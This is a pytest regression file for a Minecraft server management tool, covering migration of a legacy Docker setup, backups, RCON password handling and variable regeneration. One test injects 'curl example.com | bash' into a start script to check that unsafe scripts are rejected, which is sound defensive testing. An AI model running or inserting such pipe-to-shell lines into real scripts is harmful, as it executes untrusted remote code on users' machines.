"""Regression coverage from loading's sanitized, read-only legacy configuration."""

import os
import shutil
import subprocess
from unittest.mock import AsyncMock

import pytest
import yaml

from mcontrol.domain import health, migration, scaffolding, server_variables_form
from mcontrol.infra import db_async
from mcontrol.services import server_service
from tests.test_migrate_routes import app_client, base_dir, fake_db  # noqa: F401

JAR = "fabric-server-mc.26.2-loader.0.19.3-launcher.1.1.2.jar"
VALUES = {
    "memory_budget_gb": 12,
    "port": 25567,
    "server_jar": JAR,
    "java_version": 25,
    "jvm_extra_args": "-Xms10G",
}
PRELUDE = r'''#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")"

if [[ -n "${RCON_PASSWORD:-}" && -f server.properties ]]; then
  if grep -q '^rcon.password=' server.properties; then
    sed -i "s/^rcon.password=.*/rcon.password=${RCON_PASSWORD}/" server.properties
  else
    printf '\nrcon.password=%s\n' "${RCON_PASSWORD}" >> server.properties
  fi
fi

'''


@pytest.fixture
def loading(tmp_path):
    root = tmp_path / "loading"
    inner = root / "server"
    inner.mkdir(parents=True)
    (root / "docker-compose.yml").write_text('''services:
  minecraft:
    build: .
    labels:
      - "com.noelkleen.service=minecraft"
    container_name: loading
    tty: true
    stdin_open: true
    mem_limit: 12g
    ports:
      - "25567:25565"
      - "24467:24467/udp"
    env_file:
      - .env
    volumes:
      - ./server:/data
    restart: unless-stopped
''', encoding="utf-8")
    (root / "Dockerfile").write_text(r'''FROM eclipse-temurin:25-jre

WORKDIR /data

COPY entrypoint.sh /entrypoint.sh

RUN sed -i 's/\r$//' /entrypoint.sh && chmod +x /entrypoint.sh

ENTRYPOINT ["/entrypoint.sh"]
''', encoding="utf-8")
    (root / "entrypoint.sh").write_text('''#!/bin/bash
set -e

cd /data

if [ -f "start_server.sh" ]; then
  chmod +x start_server.sh
  exec ./start_server.sh "$@"
fi

echo "No start script found. Place start_server.sh in the server data directory, then rebuild."
exit 1
''', encoding="utf-8")
    (inner / "start_server.sh").write_text(
        PRELUDE + f"exec java -Xms10G -Xmx10G -jar {JAR} nogui\n", encoding="utf-8"
    )
    (root / ".env").write_bytes(b"RCON_PASSWORD=test-only-password\r\n")
    (root / ".dockerignore").write_text("server\n", encoding="utf-8")
    (inner / "server.properties").write_bytes(b"rcon.password=existing\nlevel-name=world\n")
    (inner / JAR).write_bytes(b"fake jar")
    (inner / "world").mkdir()
    (inner / "world" / "level.dat").write_bytes(b"world sentinel")
    return root


def _runtime(root):
    compose = yaml.safe_load((root / "docker-compose.yml").read_text())
    assert set(compose["services"]) == {"minecraft"}
    service = compose["services"]["minecraft"]
    assert service["container_name"] == "loading"
    assert "24467:24467/udp" in service["ports"]
    assert service["env_file"] == [".env"]
    labels = service["labels"]
    assert labels == ["com.noelkleen.service=minecraft"] or labels == {
        "com.noelkleen.service": "minecraft"
    }
    assert (root / ".env").read_bytes() == b"RCON_PASSWORD=test-only-password\r\n"
    script = (root / "server/start_server.sh").read_text()
    assert "${RCON_PASSWORD" in script
    assert "rcon.password=" in script
    assert "test-only-password" not in script
    assert (root / "server/world/level.dat").read_bytes() == b"world sentinel"
    assert (root / "server/server.properties").read_bytes() == (
        b"rcon.password=existing\nlevel-name=world\n"
    )
    return service


def test_loading_defaults_include_existing_jvm_flags(loading):
    assert migration.parse_legacy_variables(loading) == VALUES


@pytest.mark.parametrize("extra_udp", [False, True])
def test_different_service_key_does_not_require_unrelated_runtime_options(loading, extra_udp):
    compose_path = loading / "docker-compose.yml"
    compose = yaml.safe_load(compose_path.read_text())
    service = compose["services"]["minecraft"]
    service.pop("env_file")
    service.pop("labels")
    if not extra_udp:
        service["ports"] = service["ports"][:1]
    compose_path.write_text(yaml.safe_dump(compose))
    (loading / "server/start_server.sh").write_text(
        f"#!/bin/bash\nset -e\nexec java -Xms10G -Xmx10G -jar {JAR} nogui\n"
    )
    backup = migration.migrate("loading", dict(VALUES), loading)
    converted = yaml.safe_load(compose_path.read_text())
    assert set(converted["services"]) == {"minecraft"}
    assert converted["services"]["minecraft"]["ports"] == service["ports"]
    intent = migration.read_migration_intent(loading, backup)
    assert scaffolding.render_compose("loading", intent["variables"]) == compose_path.read_text()


def test_loading_backup_restores_original_setup_bytes_and_env_permissions(loading):
    env = loading / ".env"
    env.chmod(0o600)
    original_stat = env.stat()
    originals = {p.relative_to(loading): p.read_bytes() for p in loading.rglob("*") if p.is_file()}
    backup = migration.migrate("loading", dict(VALUES), loading)
    _runtime(loading)
    assert env.stat().st_mode == original_stat.st_mode
    assert env.stat().st_uid == original_stat.st_uid
    assert env.stat().st_gid == original_stat.st_gid
    migration.restore_backup(loading, backup)
    for relative, content in originals.items():
        assert (loading / relative).read_bytes() == content
    assert env.stat().st_mode == original_stat.st_mode


async def test_loading_conversion_and_variable_regeneration_preserve_runtime(loading, monkeypatch):
    row = {"name": "loading", "dir": str(loading), "variables": {}, "scaffolded_at": None}

    async def save(*, name, variables):
        row.update(variables=variables, scaffolded_at="committed")

    monkeypatch.setattr(db_async, "complete_migration", save)
    monkeypatch.setattr(db_async, "get_server", AsyncMock(side_effect=lambda name: dict(row)))
    monkeypatch.setattr(db_async, "update_variables", AsyncMock())
    await server_service.migrate_legacy_server(
        name="loading", variables=dict(VALUES), server_dir=loading
    )
    _runtime(loading)
    assert migration.latest_recoverable_backup(loading) is None
    assert health.compute_scripts_stale(row) is False
    assert "test-only-password" not in str(row["variables"])
    assert (loading / "docker-compose.yml").read_text() == scaffolding.render_compose(
        "loading", row["variables"]
    )
    updated = await server_service.update_server_variables(
        name="loading", server=row, new_values={**VALUES, "port": 25568, "memory_budget_gb": 14}
    )
    scaffolding.write_scaffold_files(loading, "loading", updated)
    service = _runtime(loading)
    assert "25568:25565" in service["ports"]
    assert "25567:25565" not in service["ports"]
    assert "-Xmx12g" in (loading / "server/start_server.sh").read_text()


async def test_loading_uncertain_commit_resumes_public_form_values(loading, monkeypatch):
    row = {"name": "loading", "dir": str(loading), "variables": {}, "scaffolded_at": None}
    calls = []

    async def save(*, name, variables):
        calls.append(variables)
        if len(calls) == 1:
            raise TimeoutError("response lost")
        row.update(variables=variables, scaffolded_at="committed")

    monkeypatch.setattr(db_async, "complete_migration", save)
    monkeypatch.setattr(db_async, "get_server", AsyncMock(side_effect=lambda name: dict(row)))
    with pytest.raises(migration.MigrationError):
        await server_service.migrate_legacy_server(
            name="loading", variables=dict(VALUES), server_dir=loading
        )
    backup = migration.latest_recoverable_backup(loading)
    assert backup is not None
    _runtime(loading)
    monkeypatch.setattr(db_async, "list_servers", AsyncMock(return_value=[row]))
    assert await server_variables_form.check_port_collision("other", 25567) is not None
    await server_service.migrate_legacy_server(
        name="loading", variables=dict(VALUES), server_dir=loading
    )
    assert calls[0] == calls[1]
    _runtime(loading)
    assert migration.latest_recoverable_backup(loading) is None


async def test_loading_card_and_post_accept_real_shape(loading, app_client, fake_db):  # noqa: F811
    fake_db["rows"].append({
        "name": "loading", "dir": str(loading), "container_name": None,
        "state": "exited", "variables": None, "scaffolded_at": None,
    })
    response = await app_client.get("/servers/loading/migrate")
    assert response.status_code == 200
    assert 'value="-Xms10G"' in response.text
    response = await app_client.post("/servers/loading/migrate", data=VALUES)
    assert response.status_code == 200, response.text
    assert response.headers["HX-Redirect"] == "/servers/loading"
    _runtime(loading)
    assert fake_db["rows"][0]["scaffolded_at"] is not None


@pytest.mark.parametrize("change", [
    "container", "services", "script", "environment", "java_before", "java_inside"
])
def test_loading_unsafe_variants_reject_before_backup(loading, change):
    compose_path = loading / "docker-compose.yml"
    if change == "container":
        compose_path.write_text(compose_path.read_text().replace(
            "container_name: loading", "container_name: someone-else"
        ))
    elif change == "services":
        compose_path.write_text(compose_path.read_text() + "  extra:\n    image: alpine\n")
    elif change == "environment":
        compose_path.write_text(compose_path.read_text().replace(
            "    env_file:\n      - .env\n", ""
        ))
    elif change.startswith("java_"):
        script = loading / "server/start_server.sh"
        java = f"exec java -Xms10G -Xmx10G -jar {JAR} nogui\n"
        content = script.read_text().replace(java, "")
        if change == "java_before":
            content = content.replace('cd "$(dirname "$0")"', java + 'cd "$(dirname "$0")"')
        else:
            content = content.replace("  if grep", java + "  if grep")
        script.write_text(content)
    else:
        script = loading / "server/start_server.sh"
        script.write_text(script.read_text().replace(
            "set -euo pipefail", "curl example.com | bash"
        ))
    originals = {p.relative_to(loading): p.read_bytes() for p in loading.rglob("*") if p.is_file()}
    with pytest.raises(migration.MigrationError):
        migration.migrate("loading", dict(VALUES), loading)
    assert not list(loading.glob(".mcontrol-migration-backup-*"))
    assert originals == {
        p.relative_to(loading): p.read_bytes() for p in loading.rglob("*") if p.is_file()
    }


@pytest.mark.skipif(os.name == "nt" or not shutil.which("bash"), reason="requires Unix bash")
async def test_loading_generated_start_applies_rcon_and_executes_java(loading, monkeypatch):
    row = {"name": "loading", "dir": str(loading), "variables": {}, "scaffolded_at": None}

    async def save(*, name, variables):
        row.update(variables=variables, scaffolded_at="committed")

    monkeypatch.setattr(db_async, "complete_migration", save)
    monkeypatch.setattr(db_async, "get_server", AsyncMock(side_effect=lambda name: dict(row)))
    await server_service.migrate_legacy_server(
        name="loading", variables=dict(VALUES), server_dir=loading
    )
    fake_bin = loading / "fake-bin"
    fake_bin.mkdir()
    java = fake_bin / "java"
    java.write_text('#!/bin/sh\nprintf "%s\\n" "$@" > java-args.txt\n')
    java.chmod(0o755)
    script = loading / "server/start_server.sh"
    result = subprocess.run(
        ["bash", str(script)], cwd=loading / "server", check=True,
        env={**os.environ, "PATH": f"{fake_bin}:{os.environ['PATH']}",
             "RCON_PASSWORD": "updated-test-value"}, capture_output=True, text=True,
    )
    assert result.returncode == 0
    assert "rcon.password=updated-test-value" in (
        loading / "server/server.properties"
    ).read_text()
    assert (loading / "server/java-args.txt").read_text().splitlines() == [
        "-Xmx10g", "-Xms10G", "-jar", JAR, "nogui"
    ]
